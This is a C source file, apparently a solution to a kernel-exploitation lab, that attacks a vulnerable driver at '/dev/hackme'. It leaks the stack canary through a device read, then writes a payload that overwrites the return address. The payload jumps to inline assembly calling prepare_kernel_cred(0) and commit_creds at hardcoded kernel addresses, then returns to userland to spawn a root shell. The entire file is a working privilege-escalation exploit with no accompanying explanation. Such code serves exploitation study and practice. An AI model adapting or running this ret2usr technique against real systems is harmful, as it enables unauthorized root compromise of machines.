#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/xattr.h>
#include <unistd.h>

#define DEV_PATH "/dev/hackme"

int dev;

void bak() {
  __asm__ volatile(
      ".intel_syntax noprefix;"
      "mov bak_cs, cs;"
      "mov bak_ss, ss;"
      "mov bak_rsp, rsp;"
      "pushf;"
      "pop bak_rflags;"
      ".att_syntax;");
  puts("[+] Registers backed up");
}

void bin_sh() {
  printf("[+] uid: %d\n", getuid());
  system("/bin/sh");
}

/* Backup registers */
unsigned long bak_cs, bak_rflags, bak_ss, bak_rsp, bak_rip;
unsigned long cookie;
unsigned long bak_rip = (unsigned long)bin_sh;

/*
commit_creds(prepare_kernel_cred(0));
restore regs
ret userland
*/
void shellcode() {
  __asm__ volatile(
      ".intel_syntax noprefix;"
      "mov rdi, 0;"
      "movabs rbx, 0xffffffff814c67f0;"  // prepare_kernel_cred
      "call rbx;"
      "mov rdi, rax;"
      "movabs rbx, 0xffffffff814c6410;"  // commit_creds
      "call rbx;"
      "swapgs;"
      "mov r15, bak_ss;"
      "push r15;"
      "mov r15, bak_rsp;"
      "push r15;"
      "mov r15, bak_rflags;"
      "push r15;"
      "mov r15, bak_cs;"
      "push r15;"
      "mov r15, bak_rip;"
      "push r15;"
      "iretq;"
      ".att_syntax;");
}

/* Helper functions */
void debug() {
  puts("[+] Halted execution");
  getchar();
}

void print_dump(unsigned long* data, int len) {
  for (size_t i = 0; i < len; i++) {
    printf("%zu: 0x%lx\n", i, data[i]);
  }
}

void open_dev() {
  dev = open(DEV_PATH, O_RDWR);
  puts("[+] Interacting with device");
}

void err(const char* str) { fprintf(stderr, "[-] %s\n", str); }


#define CANARY_OFF 16
void leak() {
  unsigned long buf[20];
  read(dev, buf, sizeof(buf));
  // print_dump(buf, 20);
  cookie = buf[CANARY_OFF];
}

void write_payload() {
  unsigned long payload[50];
  off_t offset = 16;
  // finding padding
  // for (size_t i = 0; i < 50; i++) {
  //   payload[i] = 0x414141414140+i;
  // }
  payload[offset++] = cookie;
  payload[offset++] = 0x0;              // rbx
  payload[offset++] = 0x0;              // r12
  payload[offset++] = 0x0;              // rbp
  payload[offset++] = (long)shellcode;  // return

  write(dev, payload, sizeof(payload));
}

/* Exploit */
int main() {
  bak();

  open_dev();
  leak();
  write_payload();
  return 0;
}
